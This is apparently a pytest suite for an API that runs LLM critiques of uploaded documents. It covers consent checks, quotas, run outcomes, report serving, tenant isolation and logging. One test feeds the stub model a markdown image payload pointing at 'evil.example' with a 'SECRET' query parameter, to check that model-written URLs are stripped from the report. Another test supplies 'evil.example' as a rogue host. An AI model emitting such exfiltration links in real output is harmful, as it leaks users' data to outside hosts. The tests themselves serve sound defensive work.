"""The critique API: consent gate, order of checks, runs, report, isolation."""

import asyncio
import re
import uuid
from collections.abc import AsyncIterator
from datetime import UTC, datetime, timedelta
from typing import Any

import httpx
import pytest
import pytest_asyncio
import structlog
from cryptography.fernet import Fernet
from sqlalchemy import func, select
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine

from src.agents.critique.model import ModelReply
from src.agents.critique.roles import ROLES, role_named
from src.api.main import app
from src.api.routes.critiques import get_job_session_factory, get_review_model
from src.auth.models import TokenPayload
from src.core.acquisition.pdf_text import ExtractedText, PageSpan
from src.core.config import settings
from src.core.memory_encryption import document_cipher
from src.middleware.auth_middleware import get_jwt_service
from src.middleware.tenant_context import TenantContext, get_tenant_context
from src.models.db.base import Base
from src.models.db.document_critique import CritiqueFinding, DocumentCritique
from src.models.db.session import get_session
from src.models.db.uploaded_document import UsageLedger
from src.repositories.critique_repository import CRITIQUE_DEADLINE_S
from src.repositories.uploaded_document_repository import UploadedDocumentRepository
from src.services import critique_service as service
from src.services.document_jobs import JobLimits
from tests.test_critique_panel import PAGE1, PAGE2, Q1, Q2, issue, reply, role_of

TOKEN = "t"
KEY = Fernet.generate_key().decode()
ORG_A, USER_A = uuid.uuid4(), uuid.uuid4()
ORG_B, USER_B = uuid.uuid4(), uuid.uuid4()
TEXT = PAGE1 + "\n\n" + PAGE2
BODY = {
    "model_id": "gemini-2.5-flash",
    "hosts": ["generativelanguage.googleapis.com"],
    "consent_text_version": "critique-consent-v1",
    "acknowledged": True,
}
FORBIDDEN = (
    r"\boriginal(ity)?\b",
    r"plagiarism[- ]free",
    r"\d+(\.\d+)?\s*%",
    r"\bscore\b",
    r"\baccept(ed)?\b",
    r"\breject(ed)?\b",
)


class _AuditLogger:
    async def log_event(self, **event: Any) -> str:
        return "audit"

    async def flush_buffer(self) -> None:
        return None


class _JWTService:
    async def validate_token(self, token: str) -> TokenPayload:
        now = datetime.now(UTC)
        return TokenPayload(
            sub=str(Caller.user),
            email="a@example.com",
            organization_id=str(Caller.org),
            jti="jti",
            iat=now,
            exp=now + timedelta(minutes=5),
        )


class Caller:
    user, org = USER_A, ORG_A


class GatedModel:
    """Answers every role after ``gate`` opens; counts only completed calls."""

    model_id = "stub-model"
    temperature = 0.2

    def __init__(self) -> None:
        self.gate = asyncio.Event()
        self.completed = 0
        self.handler: Any = lambda prompt: reply([issue(Q1)])

    async def complete(self, prompt: str) -> ModelReply:
        await self.gate.wait()
        self.completed += 1
        out = self.handler(prompt)
        if isinstance(out, Exception):
            raise out
        return out  # type: ignore[no-any-return]


@pytest.fixture(name="model")
def model_fixture() -> GatedModel:
    stub = GatedModel()
    stub.gate.set()
    return stub


@pytest_asyncio.fixture(name="factory")
async def factory_fixture(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> AsyncIterator[async_sessionmaker[AsyncSession]]:
    monkeypatch.setattr(settings, "DOCUMENT_CRITIQUE_ENABLED", True)
    monkeypatch.setattr(settings, "DOCUMENT_ENCRYPTION_KEY", KEY)
    monkeypatch.setattr(settings, "PROVIDER_TERMS_VERIFIED_ON", "2026-11-26")
    monkeypatch.setattr(settings, "GEMINI_API_KEY", "not-a-real-key")
    engine = create_async_engine(f"sqlite+aiosqlite:///{tmp_path}/c.db")
    async with engine.begin() as connection:
        await connection.run_sync(Base.metadata.create_all)
    yield async_sessionmaker(engine, expire_on_commit=False)
    await engine.dispose()


@pytest_asyncio.fixture(name="client")
async def client_fixture(
    factory: async_sessionmaker[AsyncSession], model: GatedModel
) -> AsyncIterator[httpx.AsyncClient]:
    Caller.user, Caller.org = USER_A, ORG_A

    async def override_session() -> AsyncIterator[AsyncSession]:
        async with factory() as session:
            yield session
            await session.commit()

    async def override_tenant() -> TenantContext:
        return TenantContext(user_id=str(Caller.user), organization_id=str(Caller.org))

    app.dependency_overrides[get_session] = override_session
    app.dependency_overrides[get_tenant_context] = override_tenant
    app.dependency_overrides[get_jwt_service] = _JWTService
    app.dependency_overrides[get_review_model] = lambda: lambda: model
    app.dependency_overrides[get_job_session_factory] = lambda: factory
    missing = object()
    previous = getattr(app.state, "audit_logger", missing)
    app.state.audit_logger = _AuditLogger()
    app.state.document_jobs = set()
    app.state.critique_semaphore = asyncio.Semaphore(1)
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app),
        base_url="http://test",
        headers={"Authorization": f"Bearer {TOKEN}"},
    ) as http:
        yield http
        await drain()
    for dependency in (
        get_session,
        get_tenant_context,
        get_jwt_service,
        get_review_model,
        get_job_session_factory,
    ):
        app.dependency_overrides.pop(dependency, None)
    if previous is missing:
        del app.state.audit_logger
    else:
        app.state.audit_logger = previous
    del app.state.document_jobs, app.state.critique_semaphore


async def drain() -> None:
    jobs = list(app.state.document_jobs)
    if jobs:
        await asyncio.wait_for(asyncio.gather(*jobs, return_exceptions=True), 10)


async def make_document(
    factory: async_sessionmaker[AsyncSession],
    *,
    org: uuid.UUID = ORG_A,
    user: uuid.UUID = USER_A,
    text: str = TEXT,
) -> uuid.UUID:
    extracted = ExtractedText(
        text,
        (PageSpan(1, 0, len(PAGE1)), PageSpan(2, len(PAGE1) + 2, len(text))),
        "a" * 64,
        "b" * 64,
    )
    async with factory() as session:
        row = await UploadedDocumentRepository(session, document_cipher()).create(
            organization_id=org,
            user_id=user,
            filename="paper.txt",
            media_type="plain",
            extracted=extracted,
            extractor_version="t",
            invisible_chars_removed=0,
            declared_authors=[],
            expires_at=datetime.now(UTC) + timedelta(days=30),
        )
        await session.commit()
        return row.id


async def start(
    client: httpx.AsyncClient, document_id: uuid.UUID, **overrides: Any
) -> httpx.Response:
    return await client.post(
        f"/api/v1/documents/{document_id}/critiques", json=BODY | overrides
    )


async def count(factory: async_sessionmaker[AsyncSession], model: Any) -> int:
    async with factory() as session:
        return int(await session.scalar(select(func.count()).select_from(model)) or 0)


async def run_to_end(client: httpx.AsyncClient, document_id: uuid.UUID) -> str:
    response = await start(client, document_id)
    assert response.status_code == 202, response.text
    await drain()
    return str(response.json()["id"])


# ---- config -------------------------------------------------------------------


async def test_config_is_disabled_by_default_and_names_the_consent(
    client: httpx.AsyncClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(settings, "DOCUMENT_CRITIQUE_ENABLED", False)
    monkeypatch.setattr(settings, "PROVIDER_TERMS_VERIFIED_ON", "")
    monkeypatch.setattr(settings, "GEMINI_API_KEY", None)
    response = await client.get("/api/v1/critique-config")
    assert response.status_code == 200
    body = response.json()
    assert body["enabled"] is False and body["terms_verified_on"] is None
    assert body["hosts"] == ["generativelanguage.googleapis.com"]
    assert body["max_chars"] == 1_500_000 and body["calls_per_run_max"] == 10
    (consent,) = body["consents"]
    assert consent["version"] == "critique-consent-v1"
    assert consent["sha256"] == service.CONSENTS[0].sha256
    assert consent["text"] == service.CONSENT_TEXT_V1


async def test_config_is_enabled_only_with_flag_terms_date_and_key(
    client: httpx.AsyncClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    assert (await client.get("/api/v1/critique-config")).json()["enabled"] is True
    for name, value in (
        ("DOCUMENT_CRITIQUE_ENABLED", False),
        ("PROVIDER_TERMS_VERIFIED_ON", ""),
        ("PROVIDER_TERMS_VERIFIED_ON", "not-a-date"),
        ("GEMINI_API_KEY", None),
    ):
        with monkeypatch.context() as patch:
            patch.setattr(settings, name, value)
            body = (await client.get("/api/v1/critique-config")).json()
        assert body["enabled"] is False, (name, value)


async def test_config_needs_authentication(client: httpx.AsyncClient) -> None:
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://t"
    ) as bare:
        assert (await bare.get("/api/v1/critique-config")).status_code == 401


# ---- order of checks -----------------------------------------------------------


async def test_unauthenticated_is_401_and_flag_off_is_404(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    document_id = await make_document(factory)
    url = f"/api/v1/documents/{document_id}/critiques"
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://t"
    ) as bare:
        assert (await bare.post(url, json=BODY)).status_code == 401
    monkeypatch.setattr(settings, "DOCUMENT_CRITIQUE_ENABLED", False)
    assert (await start(client, document_id)).status_code == 404
    assert (await client.get(url)).status_code == 404


async def test_a_foreign_document_is_404_before_any_other_check(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(settings, "PROVIDER_TERMS_VERIFIED_ON", "")
    foreign = await make_document(factory, org=ORG_B, user=USER_B)
    assert (await start(client, foreign)).status_code == 404
    assert (await start(client, uuid.uuid4())).status_code == 404


async def test_terms_date_empty_is_409_and_nothing_is_reserved(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    document_id = await make_document(factory)
    monkeypatch.setattr(settings, "PROVIDER_TERMS_VERIFIED_ON", "")
    response = await start(client, document_id)
    assert response.status_code == 409
    assert response.json()["error"]["code"] == "provider_terms_unverified"
    assert await count(factory, UsageLedger) == 0 and model.completed == 0


async def test_no_provider_key_is_503(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    document_id = await make_document(factory)
    monkeypatch.setattr(settings, "GEMINI_API_KEY", None)
    response = await start(client, document_id)
    assert response.status_code == 503
    assert response.json()["error"]["code"] == "provider_not_configured"


@pytest.mark.parametrize(
    "override",
    [
        {"model_id": "gemini-2.5-pro"},
        {"hosts": ["evil.example"]},
        {"hosts": []},
        {"hosts": ["generativelanguage.googleapis.com", "evil.example"]},
        {"consent_text_version": "critique-consent-v0"},
    ],
)
async def test_a_consent_that_differs_from_the_server_is_409_with_the_server_values(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
    override: dict[str, Any],
) -> None:
    document_id = await make_document(factory)
    response = await start(client, document_id, **override)
    assert response.status_code == 409
    error = response.json()["error"]
    assert error["code"] == "consent_mismatch"
    assert error["details"]["model_id"] == "gemini-2.5-flash"
    assert error["details"]["hosts"] == ["generativelanguage.googleapis.com"]
    assert error["details"]["consent_text_versions"] == ["critique-consent-v1"]
    assert await count(factory, UsageLedger) == 0 and model.completed == 0


async def test_acknowledged_false_is_422(
    client: httpx.AsyncClient, factory: async_sessionmaker[AsyncSession]
) -> None:
    document_id = await make_document(factory)
    assert (await start(client, document_id, acknowledged=False)).status_code == 422
    assert await count(factory, UsageLedger) == 0


async def test_a_document_over_the_critique_limit_is_422_and_writes_no_ledger_row(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    document_id = await make_document(factory)
    monkeypatch.setattr(service, "CRITIQUE_MAX_CHARS", len(TEXT) - 1)
    response = await start(client, document_id)
    assert response.status_code == 422
    assert response.json()["error"]["code"] == "too_long_for_critique"
    assert await count(factory, UsageLedger) == 0


async def test_a_document_exactly_at_the_limit_is_accepted(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    document_id = await make_document(factory)
    monkeypatch.setattr(service, "CRITIQUE_MAX_CHARS", len(TEXT))
    assert (await start(client, document_id)).status_code == 202


# ---- accepted request --------------------------------------------------------------


async def test_a_consented_request_is_202_before_any_provider_call_and_records_consent(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    model.gate.clear()
    document_id = await make_document(factory)
    response = await start(client, document_id)
    assert response.status_code == 202
    assert response.json()["status"] == "queued" and model.completed == 0
    async with factory() as session:
        row = (await session.execute(select(DocumentCritique))).scalar_one()
    assert row.consent_text_version == "critique-consent-v1"
    assert row.consent_text_sha256 == service.CONSENTS[0].sha256
    assert row.reserved_units == service.reserved_units(len(TEXT))
    assert row.model_id == "gemini-2.5-flash" and row.temperature == 0.2
    assert set(row.prompt_versions) == {r.name for r in ROLES}
    model.gate.set()
    await drain()


async def test_the_request_reserves_its_units_in_the_ledger(
    client: httpx.AsyncClient, factory: async_sessionmaker[AsyncSession]
) -> None:
    await run_to_end(client, await make_document(factory))
    async with factory() as session:
        ledger = (await session.execute(select(UsageLedger))).scalar_one()
    assert (ledger.kind, ledger.units) == (
        "critique",
        service.reserved_units(len(TEXT)),
    )
    assert (ledger.organization_id, ledger.user_id) == (ORG_A, USER_A)


async def test_the_sixth_critique_in_a_day_is_429_with_a_code_and_no_new_ledger_row(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(service, "CRITIQUE_LIMITS", JobLimits(per_user_daily=1))
    document_id = await make_document(factory)
    await run_to_end(client, document_id)
    response = await start(client, document_id)
    assert response.status_code == 429
    assert response.json()["error"]["code"] == "user_daily"
    assert await count(factory, UsageLedger) == 1


async def test_the_scheduled_task_joins_the_lifespans_job_set(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    model.gate.clear()
    lifespan_set = app.state.document_jobs
    await start(client, await make_document(factory))
    assert app.state.document_jobs is lifespan_set and len(lifespan_set) == 1
    model.gate.set()
    await drain()
    assert lifespan_set == set()


async def test_a_provider_setup_failure_leaves_no_row_and_no_spent_quota(
    client: httpx.AsyncClient, factory: async_sessionmaker[AsyncSession]
) -> None:
    def broken() -> Any:
        raise RuntimeError("provider setup failed")

    app.dependency_overrides[get_review_model] = lambda: broken
    document_id = await make_document(factory)
    with pytest.raises(RuntimeError):
        await start(client, document_id)
    assert await count(factory, DocumentCritique) == 0
    assert await count(factory, UsageLedger) == 0


async def test_the_request_commits_before_the_run_starts_even_if_the_session_would_not(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
) -> None:
    async def never_commits() -> AsyncIterator[AsyncSession]:
        async with factory() as session:
            yield session

    app.dependency_overrides[get_session] = never_commits
    critique_id = await run_to_end(client, await make_document(factory))
    async with factory() as session:
        row = await session.get(DocumentCritique, uuid.UUID(critique_id))
    assert row is not None and row.status == "succeeded"


# ---- runner outcomes ---------------------------------------------------------------


async def read(client: httpx.AsyncClient, critique_id: str) -> dict[str, Any]:
    response = await client.get(f"/api/v1/critiques/{critique_id}")
    assert response.status_code == 200
    return response.json()  # type: ignore[no-any-return]


async def test_every_role_succeeding_is_succeeded_with_grounded_findings(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    model.handler = lambda prompt: reply(
        [issue(Q2, category=role_named(role_of(prompt)).categories[0])]
    )
    critique = await read(
        client, await run_to_end(client, await make_document(factory))
    )
    assert critique["status"] == "succeeded" and critique["status_reason"] is None
    assert critique["completed_at"] and critique["started_at"]
    assert len(critique["findings"]) == 5
    finding = critique["findings"][0]
    assert TEXT[finding["raw_start"] : finding["raw_end"]] == finding["quote"] == Q2
    assert finding["page"] == 2 and finding["match_kind"] == "exact"
    assert set(critique["role_outcomes"]) == {r.name for r in ROLES}
    assert all(o["kept"] == 1 for o in critique["role_outcomes"].values())
    async with factory() as session:
        stored = (await session.execute(select(CritiqueFinding))).scalars().all()
    assert len(stored) == 5 and all(Q2 not in s.quote_enc for s in stored)


async def test_two_roles_failing_is_partial(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    def handler(prompt: str) -> ModelReply | Exception:
        if role_of(prompt) in {"methods", "statistics"}:
            return RuntimeError("provider down")
        return reply([issue(Q1)])

    model.handler = handler
    critique = await read(
        client, await run_to_end(client, await make_document(factory))
    )
    assert critique["status"] == "partial"
    assert critique["role_outcomes"]["methods"]["status"] == "failed"
    assert critique["role_outcomes"]["citations"]["status"] == "succeeded"


async def test_every_role_failing_is_failed_with_a_reason(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    model.handler = lambda prompt: RuntimeError("provider down")
    critique = await read(
        client, await run_to_end(client, await make_document(factory))
    )
    assert (critique["status"], critique["status_reason"]) == (
        "failed",
        "all_roles_failed",
    )
    assert critique["findings"] == []


async def test_tracing_enabled_fails_the_run_without_calling_the_provider(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("LANGSMITH_TRACING", "true")
    critique = await read(
        client, await run_to_end(client, await make_document(factory))
    )
    assert (critique["status"], critique["status_reason"]) == (
        "failed",
        "tracing_enabled",
    )
    assert model.completed == 0


# ---- report ------------------------------------------------------------------------


async def test_the_report_is_plain_text_served_as_an_attachment(
    client: httpx.AsyncClient, factory: async_sessionmaker[AsyncSession]
) -> None:
    critique_id = await run_to_end(client, await make_document(factory))
    response = await client.get(f"/api/v1/critiques/{critique_id}/report")
    assert response.status_code == 200
    assert response.headers["content-type"] == "text/plain; charset=utf-8"
    assert response.headers["content-disposition"] == (
        f'attachment; filename="critique-{critique_id}.txt"'
    )
    assert response.headers["x-content-type-options"] == "nosniff"
    for needle in (
        "gemini-2.5-flash",
        "a" * 64,
        "Model-assisted and uncalibrated",
        *service.REPORT_FOOTER,
    ):
        assert needle in response.text
    for pattern in FORBIDDEN:
        assert not re.search(pattern, response.text, re.I), pattern


async def test_the_report_is_409_until_the_run_finishes(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    model.gate.clear()
    response = await start(client, await make_document(factory))
    critique_id = response.json()["id"]
    reply_ = await client.get(f"/api/v1/critiques/{critique_id}/report")
    assert reply_.status_code == 409
    assert reply_.json()["error"]["code"] == "not_finished"
    model.gate.set()
    await drain()
    assert (
        await client.get(f"/api/v1/critiques/{critique_id}/report")
    ).status_code == 200


async def test_a_url_the_model_wrote_never_reaches_the_served_report(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    exfil = "See ![x](https://evil.example/?d=SECRET) now"
    model.handler = lambda prompt: reply([issue(Q1, problem=exfil, fix=exfil)])
    critique_id = await run_to_end(client, await make_document(factory))
    text = (await client.get(f"/api/v1/critiques/{critique_id}/report")).text
    assert "https://" not in text and "](" not in text and "SECRET" not in text


# ---- delete and stale reads ----------------------------------------------------------


async def test_deleting_a_running_critique_discards_its_late_result(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    model.gate.clear()
    critique_id = (await start(client, await make_document(factory))).json()["id"]
    for _ in range(200):
        if (await read(client, critique_id))["status"] == "running":
            break
        await asyncio.sleep(0.01)
    assert (await client.delete(f"/api/v1/critiques/{critique_id}")).status_code == 204
    model.gate.set()
    await drain()
    assert (await client.get(f"/api/v1/critiques/{critique_id}")).status_code == 404
    assert await count(factory, CritiqueFinding) == 0


async def test_a_stale_running_critique_reads_as_failed_deadline_exceeded(
    client: httpx.AsyncClient, factory: async_sessionmaker[AsyncSession]
) -> None:
    document_id = await make_document(factory)
    old = datetime.now(UTC) - timedelta(seconds=CRITIQUE_DEADLINE_S + 500)
    async with factory() as session:
        row = DocumentCritique(
            document_id=document_id,
            organization_id=ORG_A,
            user_id=USER_A,
            status="running",
            model_id="m",
            temperature=0.2,
            prompt_versions={},
            consent_text_version="v",
            consent_text_sha256="0" * 64,
            consent_recorded_at=old,
            reserved_units=1,
            role_outcomes={},
            created_at=old,
        )
        session.add(row)
        await session.commit()
        critique_id = row.id
    first = await read(client, str(critique_id))
    assert (first["status"], first["status_reason"]) == ("failed", "deadline_exceeded")
    assert (await read(client, str(critique_id)))["completed_at"] == first[
        "completed_at"
    ]


async def test_the_nested_list_returns_the_documents_critiques_newest_first(
    client: httpx.AsyncClient, factory: async_sessionmaker[AsyncSession]
) -> None:
    document_id = await make_document(factory)
    first = await run_to_end(client, document_id)
    second = await run_to_end(client, document_id)
    listed = await client.get(f"/api/v1/documents/{document_id}/critiques")
    assert [c["id"] for c in listed.json()] == [second, first]
    assert (
        await client.get(f"/api/v1/documents/{document_id}/critiques?limit=51")
    ).status_code == 422


# ---- tenant isolation ---------------------------------------------------------------


@pytest.mark.parametrize(
    ("org", "user"),
    [(ORG_B, USER_B), (ORG_A, USER_B)],
    ids=["other-org", "same-org-other-user"],
)
async def test_every_route_is_404_for_someone_elses_resources(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    org: uuid.UUID,
    user: uuid.UUID,
) -> None:
    document_id = await make_document(factory)
    critique_id = await run_to_end(client, document_id)
    Caller.user, Caller.org = user, org
    assert (await client.get(f"/api/v1/critiques/{critique_id}")).status_code == 404
    assert (
        await client.get(f"/api/v1/critiques/{critique_id}/report")
    ).status_code == 404
    assert (await start(client, document_id)).status_code == 404
    assert (
        await client.get(f"/api/v1/documents/{document_id}/critiques")
    ).status_code == 404
    assert (await client.delete(f"/api/v1/critiques/{critique_id}")).status_code == 404
    Caller.user, Caller.org = USER_A, ORG_A
    assert (await client.get(f"/api/v1/critiques/{critique_id}")).status_code == 200


# ---- logging and request shape --------------------------------------------------------


async def test_a_full_run_logs_no_document_or_model_text(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    model.handler = lambda prompt: reply([issue(Q1, problem="LEAKMARKER problem")])
    with structlog.testing.capture_logs() as captured:
        await run_to_end(client, await make_document(factory))
    blob = repr(captured)
    assert "LEAKMARKER" not in blob and Q1 not in blob and "exc_info" not in blob


async def test_no_critique_route_accepts_text_in_its_body() -> None:
    schema = app.openapi()
    allowed = {"model_id", "hosts", "consent_text_version", "acknowledged"}
    bodies = 0
    for path, methods in schema["paths"].items():
        if "critique" not in path:
            continue
        for operation in methods.values():
            content = operation.get("requestBody", {}).get("content", {})
            for media in content.values():
                bodies += 1
                ref = media["schema"]["$ref"].rsplit("/", 1)[1]
                properties = schema["components"]["schemas"][ref]["properties"]
                assert set(properties) == allowed
                for name in ("model_id", "consent_text_version"):
                    assert properties[name]["maxLength"] <= 100
    assert bodies == 1


# ---- review fixes ------------------------------------------------------------------


async def test_flag_off_is_404_even_for_a_malformed_body_but_still_401_unauthenticated(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    document_id = await make_document(factory)
    critique_id = await run_to_end(client, document_id)
    monkeypatch.setattr(settings, "DOCUMENT_CRITIQUE_ENABLED", False)
    url = f"/api/v1/documents/{document_id}/critiques"
    assert (await client.post(url, json={})).status_code == 404
    assert (await client.get(f"/api/v1/critiques/{critique_id}")).status_code == 404
    assert (
        await client.get(f"/api/v1/critiques/{critique_id}/report")
    ).status_code == 404
    assert (await client.delete(f"/api/v1/critiques/{critique_id}")).status_code == 404
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://t"
    ) as bare:
        assert (await bare.post(url, json={})).status_code == 401


@pytest.mark.parametrize("value", ["yes", 1, "true", "on"])
async def test_consent_must_be_a_real_true(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    value: Any,
) -> None:
    response = await start(client, await make_document(factory), acknowledged=value)
    assert response.status_code == 422
    assert await count(factory, UsageLedger) == 0


async def test_an_oversized_host_is_rejected_by_validation(
    client: httpx.AsyncClient, factory: async_sessionmaker[AsyncSession]
) -> None:
    response = await start(
        client, await make_document(factory), hosts=["h" * 1_000_000]
    )
    assert response.status_code == 422


async def test_every_read_is_marked_not_cacheable(
    client: httpx.AsyncClient, factory: async_sessionmaker[AsyncSession]
) -> None:
    document_id = await make_document(factory)
    critique_id = await run_to_end(client, document_id)
    for url in (
        f"/api/v1/critiques/{critique_id}",
        f"/api/v1/critiques/{critique_id}/report",
        f"/api/v1/documents/{document_id}/critiques",
    ):
        response = await client.get(url)
        assert response.headers["cache-control"] == "no-store", url


async def test_the_list_carries_summaries_without_a_findings_field(
    client: httpx.AsyncClient, factory: async_sessionmaker[AsyncSession]
) -> None:
    document_id = await make_document(factory)
    critique_id = await run_to_end(client, document_id)
    (item,) = (await client.get(f"/api/v1/documents/{document_id}/critiques")).json()
    assert item["id"] == critique_id and "findings" not in item
    assert (await read(client, critique_id))["findings"]


async def test_a_third_concurrent_critique_in_an_org_is_429_org_concurrent(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    model: GatedModel,
) -> None:
    model.gate.clear()
    document_id = await make_document(factory)
    for _ in range(2):
        assert (await start(client, document_id)).status_code == 202
    response = await start(client, document_id)
    assert response.status_code == 429
    assert response.json()["error"]["code"] == "org_concurrent"
    model.gate.set()
    await drain()


async def test_a_lost_encryption_key_is_503_not_500_on_every_document_route(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    document_id = await make_document(factory)
    monkeypatch.setattr(settings, "DOCUMENT_ENCRYPTION_KEY", "")
    assert (await start(client, document_id)).status_code == 503
    listed = await client.get(f"/api/v1/documents/{document_id}/critiques")
    assert listed.status_code == 503


async def test_a_future_terms_date_does_not_open_the_gate(
    client: httpx.AsyncClient,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    document_id = await make_document(factory)
    monkeypatch.setattr(settings, "PROVIDER_TERMS_VERIFIED_ON", "2999-01-01")
    assert (await start(client, document_id)).status_code == 409
    assert (await client.get("/api/v1/critique-config")).json()["enabled"] is False


# ---- lifespan -------------------------------------------------------------------------


async def test_startup_refuses_the_critique_flag_without_an_encryption_key(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from src.api import main
    from src.core.memory_encryption import DocumentEncryptionUnavailable

    monkeypatch.setattr(settings, "DOCUMENT_UPLOADS_ENABLED", False)
    monkeypatch.setattr(settings, "DOCUMENT_CRITIQUE_ENABLED", True)
    monkeypatch.setattr(settings, "DOCUMENT_ENCRYPTION_KEY", "")
    with pytest.raises(DocumentEncryptionUnavailable):
        async with main.lifespan(app):
            pass


async def test_the_lifespan_cancels_scheduled_jobs_when_it_closes(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from unittest.mock import AsyncMock

    from src.api import main
    from src.api.services.event_publisher import event_publisher
    from src.api.websocket.connection_manager import websocket_manager
    from src.models.db import session as db_session

    monkeypatch.setattr(settings, "DOCUMENT_CRITIQUE_ENABLED", False)
    monkeypatch.setattr(settings, "GEMINI_API_KEY", None)
    monkeypatch.setattr(settings, "ADAPTIVE_ROUTING_ENABLED", False)
    monkeypatch.setattr(settings, "LANGFUSE_ENABLED", False)
    monkeypatch.setattr(db_session, "init_db", AsyncMock())
    monkeypatch.setattr(db_session, "_async_session_factory", None)
    monkeypatch.setattr(event_publisher, "initialize", AsyncMock())
    monkeypatch.setattr(event_publisher, "shutdown", AsyncMock())
    monkeypatch.setattr(websocket_manager, "shutdown", AsyncMock())
    cancelled = asyncio.Event()

    async def blocked() -> None:
        try:
            await asyncio.Event().wait()
        except asyncio.CancelledError:
            cancelled.set()
            raise

    async with main.lifespan(app):
        assert app.state.document_jobs == set()
        task = asyncio.create_task(blocked())
        app.state.document_jobs.add(task)
        await asyncio.sleep(0)
    assert cancelled.is_set() and task.cancelled()
